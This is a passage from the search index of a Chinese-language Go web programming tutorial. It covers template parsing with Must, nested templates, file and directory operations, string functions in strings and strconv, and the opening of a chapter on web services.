URLQueryEscaper,\n}\n</code></pre></p>"},{"location":"07.4/#must","title":"Must\u64cd\u4f5c","text":"<p>\u6a21\u677f\u5305\u91cc\u9762\u6709\u4e00\u4e2a\u51fd\u6570<code>Must</code>\uff0c\u5b83\u7684\u4f5c\u7528\u662f\u68c0\u6d4b\u6a21\u677f\u662f\u5426\u6b63\u786e\uff0c\u4f8b\u5982\u5927\u62ec\u53f7\u662f\u5426\u5339\u914d\uff0c\u6ce8\u91ca\u662f\u5426\u6b63\u786e\u7684\u5173\u95ed\uff0c\u53d8\u91cf\u662f\u5426\u6b63\u786e\u7684\u4e66\u5199\u3002\u63a5\u4e0b\u6765\u6211\u4eec\u6f14\u793a\u4e00\u4e2a\u4f8b\u5b50\uff0c\u7528Must\u6765\u5224\u65ad\u6a21\u677f\u662f\u5426\u6b63\u786e\uff1a <pre><code>package main\n\nimport (\n\"fmt\"\n\"text/template\"\n)\n\nfunc main() {\ntOk := template.New(\"first\")\ntemplate.Must(tOk.Parse(\" some static text /* and a comment */\"))\nfmt.Println(\"The first one parsed OK.\")\n\ntemplate.Must(template.New(\"second\").Parse(\"some static text {{ .Name }}\"))\nfmt.Println(\"The second one parsed OK.\")\n\nfmt.Println(\"The next one ought to fail.\")\ntErr := template.New(\"check parse error with Must\")\ntemplate.Must(tErr.Parse(\" some static text {{ .Name }\"))\n}\n</code></pre> \u5c06\u8f93\u51fa\u5982\u4e0b\u5185\u5bb9</p> <pre><code>The first one parsed OK.\nThe second one parsed OK.\nThe next one ought to fail.\npanic: template: check parse error with Must:1: unexpected \"}\" in command\n</code></pre>"},{"location":"07.4/#_8","title":"\u5d4c\u5957\u6a21\u677f","text":"<p>\u6211\u4eec\u5e73\u5e38\u5f00\u53d1Web\u5e94\u7528\u7684\u65f6\u5019\uff0c\u7ecf\u5e38\u4f1a\u9047\u5230\u4e00\u4e9b\u6a21\u677f\u6709\u4e9b\u90e8\u5206\u662f\u56fa\u5b9a\u4e0d\u53d8\u7684\uff0c\u7136\u540e\u53ef\u4ee5\u62bd\u53d6\u51fa\u6765\u4f5c\u4e3a\u4e00\u4e2a\u72ec\u7acb\u7684\u90e8\u5206\uff0c\u4f8b\u5982\u4e00\u4e2a\u535a\u5ba2\u7684\u5934\u90e8\u548c\u5c3e\u90e8\u662f\u4e0d\u53d8\u7684\uff0c\u800c\u552f\u4e00\u6539\u53d8\u7684\u662f\u4e2d\u95f4\u7684\u5185\u5bb9\u90e8\u5206\u3002\u6240\u4ee5\u6211\u4eec\u53ef\u4ee5\u5b9a\u4e49\u6210<code>header</code>\u3001<code>content</code>\u3001<code>footer</code>\u4e09\u4e2a\u90e8\u5206\u3002Go\u8bed\u8a00\u4e2d\u901a\u8fc7\u5982\u4e0b\u7684\u8bed\u6cd5\u6765\u7533\u660e <pre><code>{{define \"\u5b50\u6a21\u677f\u540d\u79f0\"}}\u5185\u5bb9{{end}}\n</code></pre> \u901a\u8fc7\u5982\u4e0b\u65b9\u5f0f\u6765\u8c03\u7528\uff1a <pre><code>{{template \"\u5b50\u6a21\u677f\u540d\u79f0\"}}\n</code></pre> \u63a5\u4e0b\u6765\u6211\u4eec\u6f14\u793a\u5982\u4f55\u4f7f\u7528\u5d4c\u5957\u6a21\u677f\uff0c\u6211\u4eec\u5b9a\u4e49\u4e09\u4e2a\u6587\u4ef6\uff0c<code>header.tmpl</code>\u3001<code>content.tmpl</code>\u3001<code>footer.tmpl</code>\u6587\u4ef6\uff0c\u91cc\u9762\u7684\u5185\u5bb9\u5982\u4e0b <pre><code>//header.tmpl\n{{define \"header\"}}\n&lt;html&gt;\n&lt;head&gt;\n    &lt;title&gt;\u6f14\u793a\u4fe1\u606f&lt;/title&gt;\n&lt;/head&gt;\n&lt;body&gt;\n{{end}}\n\n//content.tmpl\n{{define \"content\"}}\n{{template \"header\"}}\n&lt;h1&gt;\u6f14\u793a\u5d4c\u5957&lt;/h1&gt;\n&lt;ul&gt;\n    &lt;li&gt;\u5d4c\u5957\u4f7f\u7528define\u5b9a\u4e49\u5b50\u6a21\u677f&lt;/li&gt;\n    &lt;li&gt;\u8c03\u7528\u4f7f\u7528template&lt;/li&gt;\n&lt;/ul&gt;\n{{template \"footer\"}}\n{{end}}\n\n//footer.tmpl\n{{define \"footer\"}}\n&lt;/body&gt;\n&lt;/html&gt;\n{{end}}\n</code></pre> \u6f14\u793a\u4ee3\u7801\u5982\u4e0b\uff1a <pre><code>package main\n\nimport (\n\"fmt\"\n\"os\"\n\"text/template\"\n)\n\nfunc main() {\ns1, _ := template.ParseFiles(\"header.tmpl\", \"content.tmpl\", \"footer.tmpl\")\ns1.ExecuteTemplate(os.Stdout, \"header\", nil)\nfmt.Println()\ns1.ExecuteTemplate(os.Stdout, \"content\", nil)\nfmt.Println()\ns1.ExecuteTemplate(os.Stdout, \"footer\", nil)\nfmt.Println()\ns1.Execute(os.Stdout, nil)\n}\n</code></pre> \u901a\u8fc7\u4e0a\u9762\u7684\u4f8b\u5b50\u6211\u4eec\u53ef\u4ee5\u770b\u5230\u901a\u8fc7<code>template.ParseFiles</code>\u628a\u6240\u6709\u7684\u5d4c\u5957\u6a21\u677f\u5168\u90e8\u89e3\u6790\u5230\u6a21\u677f\u91cc\u9762\uff0c\u5176\u5b9e\u6bcf\u4e00\u4e2a\u5b9a\u4e49\u7684{{define}}\u90fd\u662f\u4e00\u4e2a\u72ec\u7acb\u7684\u6a21\u677f\uff0c\u4ed6\u4eec\u76f8\u4e92\u72ec\u7acb\uff0c\u662f\u5e76\u884c\u5b58\u5728\u7684\u5173\u7cfb\uff0c\u5185\u90e8\u5176\u5b9e\u5b58\u50a8\u7684\u662f\u7c7b\u4f3cmap\u7684\u4e00\u79cd\u5173\u7cfb(key\u662f\u6a21\u677f\u7684\u540d\u79f0\uff0cvalue\u662f\u6a21\u677f\u7684\u5185\u5bb9)\uff0c\u7136\u540e\u6211\u4eec\u901a\u8fc7<code>ExecuteTemplate</code>\u6765\u6267\u884c\u76f8\u5e94\u7684\u5b50\u6a21\u677f\u5185\u5bb9\uff0c\u6211\u4eec\u53ef\u4ee5\u770b\u5230header\u3001footer\u90fd\u662f\u76f8\u5bf9\u72ec\u7acb\u7684\uff0c\u90fd\u80fd\u8f93\u51fa\u5185\u5bb9\uff0ccontent \u4e2d\u56e0\u4e3a\u5d4c\u5957\u4e86header\u548cfooter\u7684\u5185\u5bb9\uff0c\u5c31\u4f1a\u540c\u65f6\u8f93\u51fa\u4e09\u4e2a\u7684\u5185\u5bb9\u3002\u4f46\u662f\u5f53\u6211\u4eec\u6267\u884c<code>s1.Execute</code>\uff0c\u6ca1\u6709\u4efb\u4f55\u7684\u8f93\u51fa\uff0c\u56e0\u4e3a\u5728\u9ed8\u8ba4\u7684\u60c5\u51b5\u4e0b\u6ca1\u6709\u9ed8\u8ba4\u7684\u5b50\u6a21\u677f\uff0c\u6240\u4ee5\u4e0d\u4f1a\u8f93\u51fa\u4efb\u4f55\u7684\u4e1c\u897f\u3002</p> <p>\u540c\u4e00\u4e2a\u96c6\u5408\u7c7b\u7684\u6a21\u677f\u662f\u4e92\u76f8\u77e5\u6653\u7684\uff0c\u5982\u679c\u540c\u4e00\u6a21\u677f\u88ab\u591a\u4e2a\u96c6\u5408\u4f7f\u7528\uff0c\u5219\u5b83\u9700\u8981\u5728\u591a\u4e2a\u96c6\u5408\u4e2d\u5206\u522b\u89e3\u6790</p>"},{"location":"07.4/#_9","title":"\u603b\u7ed3","text":"<p>\u901a\u8fc7\u4e0a\u9762\u5bf9\u6a21\u677f\u7684\u8be6\u7ec6\u4ecb\u7ecd\uff0c\u6211\u4eec\u4e86\u89e3\u4e86\u5982\u4f55\u628a\u52a8\u6001\u6570\u636e\u4e0e\u6a21\u677f\u878d\u5408\uff1a\u5982\u4f55\u8f93\u51fa\u5faa\u73af\u6570\u636e\u3001\u5982\u4f55\u81ea\u5b9a\u4e49\u51fd\u6570\u3001\u5982\u4f55\u5d4c\u5957\u6a21\u677f\u7b49\u7b49\u3002\u901a\u8fc7\u6a21\u677f\u6280\u672f\u7684\u5e94\u7528\uff0c\u6211\u4eec\u53ef\u4ee5\u5b8c\u6210MVC\u6a21\u5f0f\u4e2dV\u7684\u5904\u7406\uff0c\u63a5\u4e0b\u6765\u7684\u7ae0\u8282\u6211\u4eec\u5c06\u4ecb\u7ecd\u5982\u4f55\u6765\u5904\u7406M\u548cC\u3002</p>"},{"location":"07.4/#links","title":"links","text":"<ul> <li>\u76ee\u5f55</li> <li>\u4e0a\u4e00\u8282: \u6b63\u5219\u5904\u7406</li> <li>\u4e0b\u4e00\u8282: \u6587\u4ef6\u64cd\u4f5c</li> </ul>"},{"location":"07.5/","title":"7.5 \u6587\u4ef6\u64cd\u4f5c","text":"<p>\u5728\u4efb\u4f55\u8ba1\u7b97\u673a\u8bbe\u5907\u4e2d\uff0c\u6587\u4ef6\u662f\u90fd\u662f\u5fc5\u987b\u7684\u5bf9\u8c61\uff0c\u800c\u5728Web\u7f16\u7a0b\u4e2d,\u6587\u4ef6\u7684\u64cd\u4f5c\u4e00\u76f4\u662fWeb\u7a0b\u5e8f\u5458\u7ecf\u5e38\u9047\u5230\u7684\u95ee\u9898,\u6587\u4ef6\u64cd\u4f5c\u5728Web\u5e94\u7528\u4e2d\u662f\u5fc5\u987b\u7684,\u975e\u5e38\u6709\u7528\u7684,\u6211\u4eec\u7ecf\u5e38\u9047\u5230\u751f\u6210\u6587\u4ef6\u76ee\u5f55,\u6587\u4ef6(\u5939)\u7f16\u8f91\u7b49\u64cd\u4f5c,\u73b0\u5728\u6211\u628aGo\u4e2d\u7684\u8fd9\u4e9b\u64cd\u4f5c\u505a\u4e00\u8be6\u7ec6\u603b\u7ed3\u5e76\u5b9e\u4f8b\u793a\u8303\u5982\u4f55\u4f7f\u7528\u3002</p>"},{"location":"07.5/#_1","title":"\u76ee\u5f55\u64cd\u4f5c","text":"<p>\u6587\u4ef6\u64cd\u4f5c\u7684\u5927\u591a\u6570\u51fd\u6570\u90fd\u662f\u5728os\u5305\u91cc\u9762\uff0c\u4e0b\u9762\u5217\u4e3e\u4e86\u51e0\u4e2a\u76ee\u5f55\u64cd\u4f5c\u7684\uff1a</p> <ul> <li> <p>func Mkdir(name string, perm FileMode) error</p> <p>\u521b\u5efa\u540d\u79f0\u4e3aname\u7684\u76ee\u5f55\uff0c\u6743\u9650\u8bbe\u7f6e\u662fperm\uff0c\u4f8b\u59820777</p> </li> <li> <p>func MkdirAll(path string, perm FileMode) error</p> <p>\u6839\u636epath\u521b\u5efa\u591a\u7ea7\u5b50\u76ee\u5f55\uff0c\u4f8b\u5982astaxie/test1/test2\u3002</p> </li> <li> <p>func Remove(name string) error</p> <p>\u5220\u9664\u540d\u79f0\u4e3aname\u7684\u76ee\u5f55\uff0c\u5f53\u76ee\u5f55\u4e0b\u6709\u6587\u4ef6\u6216\u8005\u5176\u4ed6\u76ee\u5f55\u65f6\u4f1a\u51fa\u9519</p> </li> <li> <p>func RemoveAll(path string) error</p> <p>\u6839\u636epath\u5220\u9664\u591a\u7ea7\u5b50\u76ee\u5f55\uff0c\u5982\u679cpath\u662f\u5355\u4e2a\u540d\u79f0\uff0c\u90a3\u4e48\u8be5\u76ee\u5f55\u4e0b\u7684\u5b50\u76ee\u5f55\u5168\u90e8\u5220\u9664\u3002</p> </li> </ul> <p>\u4e0b\u9762\u662f\u6f14\u793a\u4ee3\u7801\uff1a <pre><code>package main\n\nimport (\n\"fmt\"\n\"os\"\n)\n\nfunc main() {\nos.Mkdir(\"astaxie\", 0777)\nos.MkdirAll(\"astaxie/test1/test2\", 0777)\nerr := os.Remove(\"astaxie\")\nif err != nil {\nfmt.Println(err)\n}\nos.RemoveAll(\"astaxie\")\n}\n</code></pre></p>"},{"location":"07.5/#_2","title":"\u6587\u4ef6\u64cd\u4f5c","text":""},{"location":"07.5/#_3","title":"\u5efa\u7acb\u4e0e\u6253\u5f00\u6587\u4ef6","text":"<p>\u65b0\u5efa\u6587\u4ef6\u53ef\u4ee5\u901a\u8fc7\u5982\u4e0b\u4e24\u4e2a\u65b9\u6cd5</p> <ul> <li> <p>func Create(name string) (file *File, err Error)</p> <p>\u6839\u636e\u63d0\u4f9b\u7684\u6587\u4ef6\u540d\u521b\u5efa\u65b0\u7684\u6587\u4ef6\uff0c\u8fd4\u56de\u4e00\u4e2a\u6587\u4ef6\u5bf9\u8c61\uff0c\u9ed8\u8ba4\u6743\u9650\u662f0666\u7684\u6587\u4ef6\uff0c\u8fd4\u56de\u7684\u6587\u4ef6\u5bf9\u8c61\u662f\u53ef\u8bfb\u5199\u7684\u3002</p> </li> <li> <p>func NewFile(fd uintptr, name string) *File</p> <p>\u6839\u636e\u6587\u4ef6\u63cf\u8ff0\u7b26\u521b\u5efa\u76f8\u5e94\u7684\u6587\u4ef6\uff0c\u8fd4\u56de\u4e00\u4e2a\u6587\u4ef6\u5bf9\u8c61</p> </li> </ul> <p>\u901a\u8fc7\u5982\u4e0b\u4e24\u4e2a\u65b9\u6cd5\u6765\u6253\u5f00\u6587\u4ef6\uff1a</p> <ul> <li> <p>func Open(name string) (file *File, err Error)</p> <p>\u8be5\u65b9\u6cd5\u6253\u5f00\u4e00\u4e2a\u540d\u79f0\u4e3aname\u7684\u6587\u4ef6\uff0c\u4f46\u662f\u662f\u53ea\u8bfb\u65b9\u5f0f\uff0c\u5185\u90e8\u5b9e\u73b0\u5176\u5b9e\u8c03\u7528\u4e86OpenFile\u3002</p> </li> <li> <p>func OpenFile(name string, flag int, perm uint32) (file *File, err Error) </p> <p>\u6253\u5f00\u540d\u79f0\u4e3aname\u7684\u6587\u4ef6\uff0cflag\u662f\u6253\u5f00\u7684\u65b9\u5f0f\uff0c\u53ea\u8bfb\u3001\u8bfb\u5199\u7b49\uff0cperm\u662f\u6743\u9650      </p> </li> </ul>"},{"location":"07.5/#_4","title":"\u5199\u6587\u4ef6","text":"<p>\u5199\u6587\u4ef6\u51fd\u6570\uff1a</p> <ul> <li> <p>func (file *File) Write(b []byte) (n int, err Error)</p> <p>\u5199\u5165byte\u7c7b\u578b\u7684\u4fe1\u606f\u5230\u6587\u4ef6</p> </li> <li> <p>func (file *File) WriteAt(b []byte, off int64) (n int, err Error)</p> <p>\u5728\u6307\u5b9a\u4f4d\u7f6e\u5f00\u59cb\u5199\u5165byte\u7c7b\u578b\u7684\u4fe1\u606f</p> </li> <li> <p>func (file *File) WriteString(s string) (ret int, err Error)</p> <p>\u5199\u5165string\u4fe1\u606f\u5230\u6587\u4ef6</p> </li> </ul> <p>\u5199\u6587\u4ef6\u7684\u793a\u4f8b\u4ee3\u7801 <pre><code>package main\n\nimport (\n\"fmt\"\n\"os\"\n)\n\nfunc main() {\nuserFile := \"astaxie.txt\"\nfout, err := os.Create(userFile)        if err != nil {\nfmt.Println(userFile, err)\nreturn\n}\ndefer fout.Close()\nfor i := 0; i &lt; 10; i++ {\nfout.WriteString(\"Just a test!\\r\\n\")\nfout.Write([]byte(\"Just a test!\\r\\n\"))\n}\n}\n</code></pre></p>"},{"location":"07.5/#_5","title":"\u8bfb\u6587\u4ef6","text":"<p>\u8bfb\u6587\u4ef6\u51fd\u6570\uff1a</p> <ul> <li> <p>func (file *File) Read(b []byte) (n int, err Error)</p> <p>\u8bfb\u53d6\u6570\u636e\u5230b\u4e2d</p> </li> <li> <p>func (file *File) ReadAt(b []byte, off int64) (n int, err Error)</p> <p>\u4eceoff\u5f00\u59cb\u8bfb\u53d6\u6570\u636e\u5230b\u4e2d</p> </li> </ul> <p>\u8bfb\u6587\u4ef6\u7684\u793a\u4f8b\u4ee3\u7801: <pre><code>package main\n\nimport (\n\"fmt\"\n\"os\"\n)\n\nfunc main() {\nuserFile := \"asatxie.txt\"\nfl, err := os.Open(userFile)        if err != nil {\nfmt.Println(userFile, err)\nreturn\n}\ndefer fl.Close()\nbuf := make([]byte, 1024)\nfor {\nn, _ := fl.Read(buf)\nif 0 == n {\nbreak\n}\nos.Stdout.Write(buf[:n])\n}\n}\n</code></pre></p>"},{"location":"07.5/#_6","title":"\u5220\u9664\u6587\u4ef6","text":"<p>Go\u8bed\u8a00\u91cc\u9762\u5220\u9664\u6587\u4ef6\u548c\u5220\u9664\u6587\u4ef6\u5939\u662f\u540c\u4e00\u4e2a\u51fd\u6570</p> <ul> <li> <p>func Remove(name string) Error</p> <p>\u8c03\u7528\u8be5\u51fd\u6570\u5c31\u53ef\u4ee5\u5220\u9664\u6587\u4ef6\u540d\u4e3aname\u7684\u6587\u4ef6</p> </li> </ul>"},{"location":"07.5/#links","title":"links","text":"<ul> <li>\u76ee\u5f55</li> <li>\u4e0a\u4e00\u8282: \u6a21\u677f\u5904\u7406</li> <li>\u4e0b\u4e00\u8282: \u5b57\u7b26\u4e32\u5904\u7406</li> </ul>"},{"location":"07.6/","title":"7.6 \u5b57\u7b26\u4e32\u5904\u7406","text":"<p>\u5b57\u7b26\u4e32\u5728\u6211\u4eec\u5e73\u5e38\u7684Web\u5f00\u53d1\u4e2d\u7ecf\u5e38\u7528\u5230\uff0c\u5305\u62ec\u7528\u6237\u7684\u8f93\u5165\uff0c\u6570\u636e\u5e93\u8bfb\u53d6\u7684\u6570\u636e\u7b49\uff0c\u6211\u4eec\u7ecf\u5e38\u9700\u8981\u5bf9\u5b57\u7b26\u4e32\u8fdb\u884c\u5206\u5272\u3001\u8fde\u63a5\u3001\u8f6c\u6362\u7b49\u64cd\u4f5c\uff0c\u672c\u5c0f\u8282\u5c06\u901a\u8fc7Go\u6807\u51c6\u5e93\u4e2d\u7684strings\u548cstrconv\u4e24\u4e2a\u5305\u4e2d\u7684\u51fd\u6570\u6765\u8bb2\u89e3\u5982\u4f55\u8fdb\u884c\u6709\u6548\u5feb\u901f\u7684\u64cd\u4f5c\u3002</p>"},{"location":"07.6/#_1","title":"\u5b57\u7b26\u4e32\u64cd\u4f5c","text":"<p>\u4e0b\u9762\u8fd9\u4e9b\u51fd\u6570\u6765\u81ea\u4e8estrings\u5305\uff0c\u8fd9\u91cc\u4ecb\u7ecd\u4e00\u4e9b\u6211\u5e73\u5e38\u7ecf\u5e38\u7528\u5230\u7684\u51fd\u6570\uff0c\u66f4\u8be6\u7ec6\u7684\u8bf7\u53c2\u8003\u5b98\u65b9\u7684\u6587\u6863\u3002</p> <ul> <li> <p>func Contains(s, substr string) bool</p> <p>\u5b57\u7b26\u4e32s\u4e2d\u662f\u5426\u5305\u542bsubstr\uff0c\u8fd4\u56debool\u503c</p> </li> </ul> <pre><code>fmt.Println(strings.Contains(\"seafood\", \"foo\"))\nfmt.Println(strings.Contains(\"seafood\", \"bar\"))\nfmt.Println(strings.Contains(\"seafood\", \"\"))\nfmt.Println(strings.Contains(\"\", \"\"))\n//Output:\n//true\n//false\n//true\n//true\n</code></pre> <ul> <li> <p>func Join(a []string, sep string) string</p> <p>\u5b57\u7b26\u4e32\u94fe\u63a5\uff0c\u628aslice a\u901a\u8fc7sep\u94fe\u63a5\u8d77\u6765</p> </li> </ul> <pre><code>s := []string{\"foo\", \"bar\", \"baz\"}\nfmt.Println(strings.Join(s, \", \"))\n//Output:foo, bar, baz      \n</code></pre> <ul> <li> <p>func Index(s, sep string) int </p> <p>\u5728\u5b57\u7b26\u4e32s\u4e2d\u67e5\u627esep\u6240\u5728\u7684\u4f4d\u7f6e\uff0c\u8fd4\u56de\u4f4d\u7f6e\u503c\uff0c\u627e\u4e0d\u5230\u8fd4\u56de-1</p> </li> </ul> <p><pre><code>fmt.Println(strings.Index(\"chicken\", \"ken\"))\nfmt.Println(strings.Index(\"chicken\", \"dmr\"))\n//Output:4\n//-1\n</code></pre> - func Repeat(s string, count int) string</p> <pre><code>\u91cd\u590ds\u5b57\u7b26\u4e32count\u6b21\uff0c\u6700\u540e\u8fd4\u56de\u91cd\u590d\u7684\u5b57\u7b26\u4e32\n</code></pre> <p><pre><code>fmt.Println(\"ba\" + strings.Repeat(\"na\", 2))\n//Output:banana\n</code></pre> - func Replace(s, old, new string, n int) string</p> <pre><code>\u5728s\u5b57\u7b26\u4e32\u4e2d\uff0c\u628aold\u5b57\u7b26\u4e32\u66ff\u6362\u4e3anew\u5b57\u7b26\u4e32\uff0cn\u8868\u793a\u66ff\u6362\u7684\u6b21\u6570\uff0c\u5c0f\u4e8e0\u8868\u793a\u5168\u90e8\u66ff\u6362\n</code></pre> <p><pre><code>fmt.Println(strings.Replace(\"oink oink oink\", \"k\", \"ky\", 2))\nfmt.Println(strings.Replace(\"oink oink oink\", \"oink\", \"moo\", -1))\n//Output:oinky oinky oink\n//moo moo moo\n</code></pre> - func Split(s, sep string) []string</p> <pre><code>\u628as\u5b57\u7b26\u4e32\u6309\u7167sep\u5206\u5272\uff0c\u8fd4\u56deslice\n</code></pre> <pre><code>fmt.Printf(\"%q\\n\", strings.Split(\"a,b,c\", \",\"))\nfmt.Printf(\"%q\\n\", strings.Split(\"a man a plan a canal panama\", \"a \"))\nfmt.Printf(\"%q\\n\", strings.Split(\" xyz \", \"\"))\nfmt.Printf(\"%q\\n\", strings.Split(\"\", \"Bernardo O'Higgins\"))\n//Output:[\"a\" \"b\" \"c\"]\n//[\"\" \"man \" \"plan \" \"canal panama\"]\n//[\" \" \"x\" \"y\" \"z\" \" \"]\n//[\"\"]\n</code></pre> <ul> <li> <p>func Trim(s string, cutset string) string</p> <p>\u5728s\u5b57\u7b26\u4e32\u7684\u5934\u90e8\u548c\u5c3e\u90e8\u53bb\u9664cutset\u6307\u5b9a\u7684\u5b57\u7b26\u4e32</p> </li> </ul> <pre><code>fmt.Printf(\"[%q]\", strings.Trim(\" !!! Achtung !!! \", \"! \"))\n//Output:[\"Achtung\"]\n</code></pre> <ul> <li> <p>func Fields(s string) []string</p> <p>\u53bb\u9664s\u5b57\u7b26\u4e32\u7684\u7a7a\u683c\u7b26\uff0c\u5e76\u4e14\u6309\u7167\u7a7a\u683c\u5206\u5272\u8fd4\u56deslice</p> </li> </ul> <pre><code>fmt.Printf(\"Fields are: %q\", strings.Fields(\"  foo bar  baz   \"))\n//Output:Fields are: [\"foo\" \"bar\" \"baz\"]\n</code></pre>"},{"location":"07.6/#_2","title":"\u5b57\u7b26\u4e32\u8f6c\u6362","text":"<p>\u5b57\u7b26\u4e32\u8f6c\u5316\u7684\u51fd\u6570\u5728strconv\u4e2d\uff0c\u5982\u4e0b\u4e5f\u53ea\u662f\u5217\u51fa\u4e00\u4e9b\u5e38\u7528\u7684\uff1a</p> <ul> <li>Append \u7cfb\u5217\u51fd\u6570\u5c06\u6574\u6570\u7b49\u8f6c\u6362\u4e3a\u5b57\u7b26\u4e32\u540e\uff0c\u6dfb\u52a0\u5230\u73b0\u6709\u7684\u5b57\u8282\u6570\u7ec4\u4e2d\u3002</li> </ul> <pre><code>package main\n\nimport (\n\"fmt\"\n\"strconv\"\n)\n\nfunc main() {\nstr := make([]byte, 0, 100)\nstr = strconv.AppendInt(str, 4567, 10)\nstr = strconv.AppendBool(str, false)\nstr = strconv.AppendQuote(str, \"abcdefg\")\nstr = strconv.AppendQuoteRune(str, '\u5355')\nfmt.Println(string(str))\n}\n</code></pre> <ul> <li> <p>Format \u7cfb\u5217\u51fd\u6570\u628a\u5176\u4ed6\u7c7b\u578b\u7684\u8f6c\u6362\u4e3a\u5b57\u7b26\u4e32 <pre><code>package main\n\nimport (\n\"fmt\"\n\"strconv\"\n)\n\nfunc main() {\na := strconv.FormatBool(false)\nb := strconv.FormatFloat(123.23, 'g', 12, 64)\nc := strconv.FormatInt(1234, 10)\nd := strconv.FormatUint(12345, 10)\ne := strconv.Itoa(1023)\nfmt.Println(a, b, c, d, e)\n}\n</code></pre></p> </li> <li> <p>Parse \u7cfb\u5217\u51fd\u6570\u628a\u5b57\u7b26\u4e32\u8f6c\u6362\u4e3a\u5176\u4ed6\u7c7b\u578b</p> </li> </ul> <pre><code>package main\n\nimport (\n\"fmt\"\n\"strconv\"\n)\nfunc checkError(e error){\nif e != nil{\nfmt.Println(e)\n}\n}\nfunc main() {\na, err := strconv.ParseBool(\"false\")\ncheckError(err)\nb, err := strconv.ParseFloat(\"123.23\", 64)\ncheckError(err)\nc, err := strconv.ParseInt(\"1234\", 10, 64)\ncheckError(err)\nd, err := strconv.ParseUint(\"12345\", 10, 64)\ncheckError(err)\ne, err := strconv.Atoi(\"1023\")\ncheckError(err)\nfmt.Println(a, b, c, d, e)\n}\n</code></pre>"},{"location":"07.6/#links","title":"links","text":"<ul> <li>\u76ee\u5f55</li> <li>\u4e0a\u4e00\u8282: \u6587\u4ef6\u64cd\u4f5c</li> <li>\u4e0b\u4e00\u8282: \u5c0f\u7ed3</li> </ul>"},{"location":"07.7/","title":"7.7 \u5c0f\u7ed3","text":"<p>\u8fd9\u4e00\u7ae0\u7ed9\u5927\u5bb6\u4ecb\u7ecd\u4e86\u4e00\u4e9b\u6587\u672c\u5904\u7406\u7684\u5de5\u5177\uff0c\u5305\u62ecXML\u3001JSON\u3001\u6b63\u5219\u548c\u6a21\u677f\u6280\u672f\uff0cXML\u548cJSON\u662f\u6570\u636e\u4ea4\u4e92\u7684\u5de5\u5177\uff0c\u901a\u8fc7XML\u548cJSON\u4f60\u53ef\u4ee5\u8868\u8fbe\u5404\u79cd\u542b\u4e49\uff0c\u901a\u8fc7\u6b63\u5219\u4f60\u53ef\u4ee5\u5904\u7406\u6587\u672c(\u641c\u7d22\u3001\u66ff\u6362\u3001\u622a\u53d6)\uff0c\u901a\u8fc7\u6a21\u677f\u6280\u672f\u4f60\u53ef\u4ee5\u5c55\u73b0\u8fd9\u4e9b\u6570\u636e\u7ed9\u7528\u6237\u3002\u8fd9\u4e9b\u90fd\u662f\u4f60\u5f00\u53d1Web\u5e94\u7528\u8fc7\u7a0b\u4e2d\u9700\u8981\u7528\u5230\u7684\u6280\u672f\uff0c\u901a\u8fc7\u8fd9\u4e2a\u5c0f\u8282\u7684\u4ecb\u7ecd\u4f60\u80fd\u591f\u4e86\u89e3\u5982\u4f55\u5904\u7406\u6587\u672c\u3001\u5c55\u73b0\u6587\u672c\u3002</p>"},{"location":"07.7/#links","title":"links","text":"<ul> <li>\u76ee\u5f55</li> <li>\u4e0a\u4e00\u8282: \u5b57\u7b26\u4e32\u5904\u7406</li> <li>\u4e0b\u4e00\u8282: Web\u670d\u52a1</li> </ul>"},{"location":"08.0/","title":"8 Web\u670d\u52a1","text":"<p>Web\u670d\u52a1\u53ef\u4ee5\u8ba9\u4f60\u5728HTTP\u534f\u8bae\u7684\u57fa\u7840\u4e0a\u901a\u8fc7XML\u6216\u8005JSON\u6765\u4ea4\u6362\u4fe1\u606f\u3002\u5982\u679c\u4f60\u60f3\u77e5\u9053\u4e0a\u6d77\u7684\u5929\u6c14\u9884\u62a5\u3001\u4e2d\u56fd\u77f3\u6cb9\u7684\u80a1\u4ef7\u6216\u8005\u6dd8\u5b9d\u5546\u5bb6\u7684\u4e00\u4e2a\u5546\u54c1\u4fe1\u606f\uff0c\u4f60\u53ef\u4ee5\u7f16\u5199\u4e00\u6bb5\u7b80\u77ed\u7684\u4ee3\u7801\uff0c\u901a\u8fc7\u6293\u53d6\u8fd9\u4e9b\u4fe1\u606f\u7136\u540e\u901a\u8fc7\u6807\u51c6\u7684\u63a5\u53e3\u5f00\u653e\u51fa\u6765\uff0c\u5c31\u5982\u540c\u4f60\u8c03\u7528\u4e00\u4e2a\u672c\u5730\u51fd\u6570\u5e76\u8fd4\u56de\u4e00\u4e2a\u503c\u3002</p> <p>Web\u670d\u52a1\u80cc\u540e\u7684\u5173\u952e\u5728\u4e8e\u5e73\u53f0\u7684\u65e0\u5173\u6027\uff0c\u4f60\u53ef\u4ee5\u8fd0\u884c\u4f60\u7684\u670d\u52a1\u5728Linux\u7cfb\u7edf\uff0c\u53ef\u4ee5\u4e0e\u5176\u4ed6Windows\u7684asp.net\u7a0b\u5e8f\u4ea4\u4e92\uff0c\u540c\u6837\u7684\uff0c\u4e5f\u53ef\u4ee5\u901a\u8fc7\u540c\u4e00\u4e2a\u63a5\u53e3\u548c\u8fd0\u884c\u5728FreeBSD\u4e0a\u9762\u7684JSP\u65e0\u969c\u788d\u5730\u901a\u4fe1\u3002</p> <p>\u76ee\u524d\u4e3b\u6d41\u7684\u6709\u5982\u4e0b\u51e0\u79cdWeb\u670d\u52a1\uff1aREST\u3001SOAP\u3002</p> <p>REST\u8bf7\u6c42\u662f\u5f88\u76f4\u89c2\u7684\uff0c\u56e0\u4e3aREST\u662f\u57fa\u4e8eHTTP\u534f\u8bae\u7684\u4e00\u4e2a\u8865\u5145\uff0c\u4ed6\u7684\u6bcf\u4e00\u6b21\u8bf7\u6c42\u90fd\u662f\u4e00\u4e2aHTTP\u8bf7\u6c42\uff0c\u7136\u540e\u6839\u636e\u4e0d\u540c\u7684method\u6765\u5904\u7406\u4e0d\u540c\u7684\u903b\u8f91\uff0c\u5f88\u591aWeb\u5f00\u53d1\u8005\u90fd\u719f\u6089HTTP\u534f\u8bae\uff0c\u6240\u4ee5\u5b66\u4e60REST\u662f\u4e00\u4ef6\u6bd4\u8f83\u5bb9\u6613\u7684\u4e8b\u60c5\u3002\u6240\u4ee5\u6211\u4eec\u57288.3\u5c0f\u8282\u5c06\u8be6\u7ec6\u7684\u8bb2\u89e3\u5982\u4f55\u5728Go\u8bed\u8a00\u4e2d\u6765\u5b9e\u73b0REST\u65b9\u5f0f\u3002</p> 